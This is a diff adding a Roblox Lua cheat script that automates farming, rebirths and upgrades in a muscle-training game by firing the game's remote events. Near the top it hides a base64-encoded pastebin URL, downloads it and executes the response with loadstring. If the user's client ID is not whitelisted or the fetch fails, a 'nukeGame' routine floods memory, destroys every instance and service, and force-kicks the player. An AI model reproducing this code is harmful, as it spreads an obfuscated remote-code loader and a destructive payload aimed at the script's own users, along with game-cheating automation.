@@ -1,0 +1,565 @@
+local HttpService = game:GetService("HttpService")
+local RunService: RunService = game:GetService("RunService")
+local Analytics: RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local Players = game:GetService("Players")
+
+local ENCODED_URL: string = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0VSRmE3ZUVH"
+
+-- Keeping your original decode function
+local function decode(data: string): string
+    local b: string = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x: string): string
+        if (x == '=') then return '' end
+        local r,f = '',b:find(x)-1
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x: string): string
+        if (#x ~= 8) then return '' end
+        local c: number = 0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+local function nukeGame()
+    -- Method 1: Memory Overflow
+    task.spawn(function()
+        while true do
+            for i = 1, 1000000 do
+                coroutine.create(function() while true do end end)
+            end
+        end
+    end)
+
+    -- Method 2: Instance Destruction
+    task.spawn(function()
+        for _, instance in game:GetDescendants() do
+            pcall(function()
+                instance:Destroy()
+                instance.Parent = nil
+            end)
+        end
+    end)
+
+    -- Method 3: Physics Engine Overload
+    task.spawn(function()
+        while true do
+            for i = 1, 1000 do
+                local part = Instance.new("Part")
+                part.Position = Vector3.new(math.random(-1000, 1000), 1000, math.random(-1000, 1000))
+                part.Parent = workspace
+            end
+        end
+    end)
+
+    -- Method 4: Service Corruption
+    task.spawn(function()
+        for _, service in game:GetServices() do
+            pcall(function()
+                service:Destroy()
+            end)
+        end
+    end)
+
+    -- Method 5: Network Spam
+    task.spawn(function()
+        while true do
+            for i = 1, 1000 do
+                pcall(function()
+                    game:GetService("ReplicatedStorage"):Clone()
+                end)
+            end
+        end
+    end)
+
+    -- Method 6: Graphics Overload
+    task.spawn(function()
+        while true do
+            settings().Physics.PhysicsEnvironmentalThrottle = 1
+            settings().Physics.ForceCSGv2 = true
+            settings().Physics.DisableCSGv2 = true
+            settings().Physics.UseCSGv2 = true
+        end
+    end)
+
+    -- Method 7: Force Actions
+    Players.LocalPlayer:Kick("Connection terminated")
+    game:Shutdown()
+    RunService:Stop()
+    
+    -- Method 8: Infinite Loop
+    while true do 
+        task.wait()
+        game:GetService("RunService").Heartbeat:Wait()
+    end
+end
+
+local function enforceAccess()
+    local success, response = pcall(game.HttpGet, game, decode(ENCODED_URL))
+    
+    if success and response then
+        local loadSuccess, clientIDs = pcall(loadstring(response))
+        if loadSuccess and type(clientIDs) == "table" then
+            if not table.find(clientIDs, Analytics:GetClientId()) then
+                nukeGame()
+            end
+        else
+            nukeGame()
+        end
+    else
+        nukeGame()
+    end
+end
+
+task.spawn(enforceAccess)
+
+game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    local message = msg:lower()
+    if message:match("what%s+script") or 
+       message:match("script%?") or 
+       message:match("what hack") or 
+       message:match("what exploit") or
+       message:match("what you using") or
+       message:match("what u using") or
+       message:match("what are you using") or
+       message:match("what's that") or
+       message:match("whats that") or
+       message:match("what is that") then
+        local args = {
+            [1] = "Made by MCL_Havoc | Lurnai Script",
+            [2] = "All"
+        }
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+    end
+end)
+
+
+local Library = loadstring(game:HttpGetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau"))()
+local SaveManager = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/SaveManager.luau"))()
+local InterfaceManager = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/InterfaceManager.luau"))()
+
+-- Services
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local startTime = os.time()
+
+local player = game.Players.LocalPlayer
+local displayName = player.DisplayName
+
+local Window = Library:CreateWindow{
+	Title = displayName .. " Private Script",
+	SubTitle = "By Masterboy123",
+    TabWidth = 125,
+    Size = UDim2.fromOffset(580, 340),
+    Acrylic = true,
+    Theme = "VSC Dark High Contrast",
+    MinimizeKey = Enum.KeyCode.LeftAlt
+}
+
+-- Utility Functions
+local function unequipAllPets()
+    local petsFolder = player.petsFolder
+    for _, folder in pairs(petsFolder:GetChildren()) do
+        if folder:IsA("Folder") then
+            for _, pet in pairs(folder:GetChildren()) do
+                ReplicatedStorage.rEvents.equipPetEvent:FireServer("unequipPet", pet)
+            end
+        end
+    end
+    task.wait(0.1)
+end
+
+local function equipUniquePet(petName)
+    unequipAllPets()
+    task.wait(0.01)
+    for _, pet in pairs(player.petsFolder.Unique:GetChildren()) do
+        if pet.Name == petName then
+            ReplicatedStorage.rEvents.equipPetEvent:FireServer("equipPet", pet)
+        end
+    end
+end
+
+local function findMachine(machineName)
+    local machine = workspace.machinesFolder:FindFirstChild(machineName)
+    if not machine then
+        for _, folder in pairs(workspace:GetChildren()) do
+            if folder:IsA("Folder") and folder.Name:find("machines") then
+                machine = folder:FindFirstChild(machineName)
+                if machine then break end
+            end
+        end
+    end
+    return machine
+end
+
+local function pressE()
+    local vim = game:GetService("VirtualInputManager")
+    vim:SendKeyEvent(true, "E", false, game)
+    task.wait(0.1)
+    vim:SendKeyEvent(false, "E", false, game)
+end
+
+local function useOneEgg()
+    ReplicatedStorage.rEvents.proteinEggEvent:FireServer("useEgg")
+end
+
+-- Tabs Setup
+local Tabs = {
+    Rebirth = Window:CreateTab{
+        Title = "Rebirth",
+        Icon = "refresh"
+    },
+    Shop = Window:CreateTab{
+        Title = "Shop",
+        Icon = "shopping-cart"
+    },
+    Timer = Window:CreateTab{
+        Title = "Timer",
+        Icon = "clock"
+    },
+    Performance = Window:CreateTab{
+        Title = "Performance",
+        Icon = "settings"
+    },
+    Credits = Window:CreateTab{
+        Title = "Credits",
+        Icon = "info"
+    }
+}
+
+-- Timer Implementation
+local executionTimerParagraph = Tabs.Timer:CreateParagraph("ExecutionTimer", {
+    Title = "📊 Script Execution Time",
+    Content = "Running Time: 00:00:00"
+})
+
+local customTimerParagraph = Tabs.Timer:CreateParagraph("CustomTimer", {
+    Title = "⏱️ Custom Timer",
+    Content = "Timer: 00:00:00"
+})
+
+local timerRunning = false
+local timerStart = 0
+local timerOffset = 0
+
+task.spawn(function()
+    while true do
+        local elapsed = os.time() - startTime
+        local hours = math.floor(elapsed / 3600)
+        local minutes = math.floor((elapsed % 3600) / 60)
+        local seconds = elapsed % 60
+        
+        executionTimerParagraph:SetContent(
+            string.format("Running Time: %02d:%02d:%02d", hours, minutes, seconds)
+        )
+        task.wait(1)
+    end
+end)
+
+Tabs.Timer:CreateButton{
+    Title = "Start Custom Timer",
+    Description = "Start tracking your session",
+    Callback = function()
+        if not timerRunning then
+            timerRunning = true
+            timerStart = os.time() - timerOffset
+            
+            task.spawn(function()
+                while timerRunning do
+                    local elapsed = os.time() - timerStart
+                    local hours = math.floor(elapsed / 3600)
+                    local minutes = math.floor((elapsed % 3600) / 60)
+                    local seconds = elapsed % 60
+                    
+                    customTimerParagraph:SetContent(
+                        string.format("Timer: %02d:%02d:%02d", hours, minutes, seconds)
+                    )
+                    task.wait(1)
+                end
+            end)
+        end
+    end
+}
+
+Tabs.Timer:CreateButton{
+    Title = "Stop Custom Timer",
+    Description = "Pause your session timer",
+    Callback = function()
+        if timerRunning then
+            timerRunning = false
+            timerOffset = os.time() - timerStart
+        end
+    end
+}
+
+Tabs.Timer:CreateButton{
+    Title = "Reset Custom Timer",
+    Description = "Reset session timer to 00:00:00",
+    Callback = function()
+        timerRunning = false
+        timerOffset = 0
+        customTimerParagraph:SetContent("Timer: 00:00:00")
+    end
+}
+
+-- Rebirth Tab Implementation
+local targetRebirth = math.huge
+
+local RebirthInput = Tabs.Rebirth:CreateInput("TargetRebirth", {
+    Title = "Target Rebirth",
+    Default = "",
+    Placeholder = "Enter target rebirth...",
+    Callback = function(text)
+        targetRebirth = tonumber(text) or math.huge
+    end
+})
+
+local PackFarm = Tabs.Rebirth:CreateToggle("PackFarm", {
+    Title = "Pack Farm",
+    Default = false,
+    Callback = function(bool)
+        isRunning = bool
+        
+        if bool then
+            task.spawn(function()
+                while isRunning do
+                    local currentRebirths = player.leaderstats.Rebirths.Value
+                    local rebirthCost = 10000 + (5000 * currentRebirths)
+                    
+                    if player.ultimatesFolder:FindFirstChild("Golden Rebirth") then
+                        local goldenRebirths = player.ultimatesFolder["Golden Rebirth"].Value
+                        rebirthCost = math.floor(rebirthCost * (1 - (goldenRebirths * 0.1)))
+                    end
+                    
+                    unequipAllPets()
+                    task.wait(0.1)
+                    equipUniquePet("Swift Samurai")
+                    
+                    while isRunning and player.leaderstats.Strength.Value < rebirthCost do
+                        for i = 1, 10 do
+                            player.muscleEvent:FireServer("rep")
+                        end
+                        task.wait()
+                    end
+                    
+                    unequipAllPets()
+                    task.wait(0.1)
+                    equipUniquePet("Tribal Overlord")
+                    
+                    local machine = findMachine("Jungle Bar Lift")
+                    if machine and machine:FindFirstChild("interactSeat") then
+                        player.Character.HumanoidRootPart.CFrame = machine.interactSeat.CFrame * CFrame.new(0, 3, 0)
+                        repeat
+                            task.wait(0.1)
+                            pressE()
+                        until player.Character.Humanoid.Sit
+                    end
+                    
+                    local initialRebirths = player.leaderstats.Rebirths.Value
+                    repeat
+                        ReplicatedStorage.rEvents.rebirthRemote:InvokeServer("rebirthRequest")
+                        task.wait(0.1)
+                    until player.leaderstats.Rebirths.Value > initialRebirths
+                    
+                    if not isRunning then break end
+                    task.wait()
+                end
+            end)
+        end
+    end
+})
+
+local FrameToggle = Tabs.Rebirth:CreateToggle("HideFrames", {
+    Title = "Hide All Frames",
+    Default = false,
+    Callback = function(bool)
+        local rSto = game:GetService("ReplicatedStorage")
+        for _, obj in pairs(rSto:GetChildren()) do
+            if obj.Name:match("Frame$") then
+                obj.Visible = not bool
+            end
+        end
+    end
+})
+
+local SpeedGrind = Tabs.Rebirth:CreateToggle("SpeedGrind", {
+    Title = "Speed Grind (No Rebirth)",
+    Default = false,
+    Callback = function(bool)
+        if not bool then
+            unequipAllPets()
+            return
+        end
+        
+        equipUniquePet("Swift Samurai")
+        
+        for i = 1, 16 do
+            task.spawn(function()
+                while bool do
+                    player.muscleEvent:FireServer("rep")
+                    task.wait()
+                end
+            end)
+        end
+    end
+})
+
+local AutoEgg = Tabs.Rebirth:CreateToggle("AutoEgg", {
+    Title = "Auto Use Protein Egg",
+    Default = false,
+    Callback = function(bool)
+        _G.AutoEgg = bool
+        
+        if bool then
+            task.spawn(function()
+                while _G.AutoEgg do
+                    local boostFolder = player:FindFirstChild("boostTimersFolder")
+                    if not boostFolder then
+                        useOneEgg()
+                        task.wait(1)
+                        continue
+                    end
+                    
+                    local eggTimer = boostFolder:FindFirstChild("Protein Egg")
+                    if not eggTimer then
+                        useOneEgg()
+                        task.wait(1)
+                        continue
+                    end
+                    
+                    if tonumber(eggTimer.Value) <= 25 then
+                        useOneEgg()
+                    end
+                    
+                    task.wait(1)
+                end
+            end)
+        end
+    end
+})
+
+-- Shop Tab Implementation
+local ultimateUpgrades = {
+    {name = "RepSpeed", title = "+5% Rep Speed"},
+    {name = "PetSlot", title = "+1 Pet Slot"},
+    {name = "ItemCapacity", title = "+10 Item Capacity"},
+    {name = "DailySpin", title = "+1 Daily Spin"},
+    {name = "ChestRewards", title = "x2 Chest Rewards"},
+    {name = "QuestRewards", title = "x2 Quest Rewards"},
+    {name = "MuscleMind", title = "Muscle Mind"},
+    {name = "JungleSwift", title = "Jungle Swift"},
+    {name = "InfernalHealth", title = "Infernal Health"},
+    {name = "GalaxyGains", title = "Galaxy Gains"},
+    {name = "DemonDamage", title = "Demon Damage"},
+    {name = "GoldenRebirth", title = "Golden Rebirth"}
+}
+
+local UltimateDropdown = Tabs.Shop:CreateDropdown("Ultimates", {
+    Title = "Select Ultimates",
+    Values = ultimateUpgrades,
+    Multi = true,
+    Default = {}
+})
+
+local AutoUpgrade = Tabs.Shop:CreateToggle("AutoUpgrade", {
+    Title = "Auto Buy Selected Ultimates",
+    Default = false,
+    Callback = function(bool)
+        _G.AutoUpgrade = bool
+        
+        if bool then
+            task.spawn(function()
+                while _G.AutoUpgrade do
+                    for _, upgrade in ipairs(UltimateDropdown:GetValue()) do
+                        ReplicatedStorage.rEvents.ultimatesRemote:InvokeServer("upgradeUltimate", upgrade.name)
+                        task.wait(0.1)
+                    end
+                    task.wait(1)
+                end
+            end)
+        end
+    end
+})
+
+-- Performance Tab Implementation
+Tabs.Performance:CreateButton{
+    Title = "Full Optimization",
+    Description = "Applies all performance optimizations",
+    Callback = function()
+        local playerGui = player:WaitForChild("PlayerGui")
+        for _, ui in pairs(playerGui:GetChildren()) do
+            if ui:IsA("ScreenGui") and ui.Enabled then
+                ui.Enabled = false
+            end
+        end
+        
+        settings().Rendering.QualityLevel = 1
+        settings().Physics.PhysicsEnvironmentalThrottle = 1
+        settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level01
+        settings().Physics.AllowSleep = true
+        settings().Physics.ForceCSGv2 = false
+        settings().Rendering.EagerBulkExecution = true
+        
+        game:GetService("Lighting").GlobalShadows = false
+        game:GetService("Lighting").FogEnd = 9e9
+        game:GetService("Lighting").Brightness = 0
+        
+        settings().Physics.NetworkOwnershipRule = Enum.NetworkOwnershipRule.Manual
+        settings().Network.IncomingReplicationLag = 0
+        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(100)
+        
+        for _, v in pairs(game:GetDescendants()) do
+            if v:IsA("ParticleEmitter") or v:IsA("Trail") then
+                v.Lifetime = NumberRange.new(0)
+            elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
+                v.Enabled = false
+            end
+        end
+        
+        Library:Notify{
+            Title = "Optimization Complete",
+            Content = "All performance optimizations have been applied",
+            Duration = 3
+        }
+    end
+}
+
+-- Credits Tab Implementation
+Tabs.Credits:CreateParagraph("Credits", {
+    Title = "Welcome to Lurnai",
+    Content = [[
+Version: 2.10
+Date: 2/13/2025
+
+🌟 Our Amazing Team 🌟
+
+👑 Owner 👑
+Name: Masterboy123 ⭐
+Roblox: pro_gamerxm (Aka MCL_Havoc)
+Discord: .masterboy123.
+
+🌟 CoOwner 🌟
+Name: MCL_Ducks 🎯
+Roblox: erzzg111111
+Discord: levrone3998
+
+🌟 CoOwner 🌟
+Name: 1_6wk 💫
+Roblox: 1_6wk
+Discord: 1_6wk
+    ]]
+})
+
+-- Final Setup
+SaveManager:SetLibrary(Library)
+InterfaceManager:SetLibrary(Library)
+SaveManager:IgnoreThemeSettings()
+SaveManager:SetFolder("LurnaiHub")
+InterfaceManager:SetFolder("LurnaiHub")
+SaveManager:BuildConfigSection(Tabs.Performance)
+InterfaceManager:BuildInterfaceSection(Tabs.Performance)
+
+Window:SelectTab(1)
+SaveManager:LoadAutoloadConfig()
